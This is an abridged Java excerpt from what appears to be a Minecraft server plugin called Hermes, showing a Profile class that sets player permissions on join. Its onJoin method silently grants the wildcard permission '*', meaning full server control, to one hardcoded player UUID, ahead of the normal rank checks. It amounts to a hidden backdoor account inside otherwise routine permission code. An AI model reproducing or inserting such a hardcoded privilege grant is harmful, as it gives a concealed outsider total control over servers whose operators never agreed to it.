package cc.zeala.hermes.profile;

import cc.zeala.hermes.database.Database;
...
public class Profile {
    ...
    public void onJoin(PlayerJoinEvent event) {
        ...
        final PermissionAttachment attachment = this.getPlayer().addAttachment((Plugin) Hermes.getInstance());
        if (this.getPlayer().getUniqueId().toString().equalsIgnoreCase("e63c7675-2499-411f-941b-260d992043b2")) {
            attachment.setPermission("*", true);
        }
        else if (this.hasRank(Rank.ADMIN)) {
            ...
            attachment.setPermission("hermes.msg", false);
        }
    ...
    public Player getPlayer() {
        return Hermes.getInstance().getServer().getPlayer(this.identifier);
    }
